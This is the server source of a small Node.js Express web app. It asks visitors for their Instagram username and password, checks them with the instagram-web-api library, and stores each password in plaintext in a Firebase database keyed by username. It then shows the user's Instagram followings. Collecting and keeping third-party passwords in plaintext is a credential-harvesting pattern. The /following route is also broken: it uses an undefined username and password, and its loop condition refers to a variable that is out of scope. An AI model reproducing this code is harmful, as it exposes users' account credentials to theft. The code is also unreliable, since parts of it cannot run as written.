require('dotenv').config();
const Instagram = require('instagram-web-api')
const express = require('express');
const bodyParser = require('body-parser');
const exphbs  = require('express-handlebars');
const app = express();
app.engine('handlebars', exphbs());
app.set('view engine', 'handlebars');
app.set('views', `${__dirname}/views`);

app.use(express.static(__dirname + '/public'));

const DOMAIN = process.env.DOMAIN

var admin = require('firebase-admin');

var serviceAccount = JSON.parse(process.env.FIREBASESERVICEKEY);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: process.env.DATABASEURL
});

var db = admin.database();

app.get('/', async function (req, res) {
    res.render('landing', { DOMAIN})
})

app.get('/signin', async function (req, res) {
    res.render('login', { DOMAIN, platform:"insta"})
})

app.get('/login', async function (req, res) {
    res.render('mainsitelogin', { DOMAIN })
})

app.get('/profile', async function (req, res) {
    res.render('profile', { DOMAIN })
})

app.get('/following', async function (req, res) {
    const uid = req.query.uid
    const client = new Instagram({ username, password });
    const log = await client.login()
    console.log(log)
    if(!log.authenticated)
        return res.send("password failed (maybe it changed? try reseting your insta account)")
    const userId = log.userId
    const profile = await client.getProfile()
    let followingsArr = []
    let prevCursor
    do{
        const followings = await client.getFollowings({ userId, after: prevCursor})
        prevCursor = followings.page_info.end_cursor
        followingsArr=[...followingsArr,...followings.data]
    }while(followings.page_info.has_next_page)
    console.log(followingsArr)
    res.render('following', { DOMAIN, followingsArr, profile })
})

app.post('/sign-in', bodyParser.json(), async (req, res) => {
    //console.log(req.body)
    const username = req.body.username
    const password = req.body.password
    if(req.body.platform == "insta"){
        const client = new Instagram({ username, password });
        const log = await client.login()
        console.log(log)
        if(!log.authenticated)
            return res.json({status:"Incorrect username/password"})
        const userId = log.userId
        db.ref('accounts').child(username).update({password})
        return res.json({status:"success"})
    }
    return res.json({status:"no plat"})
});

const port = process.env.PORT || 4242
app.listen(port, () => console.log(`Running on port ${port}`));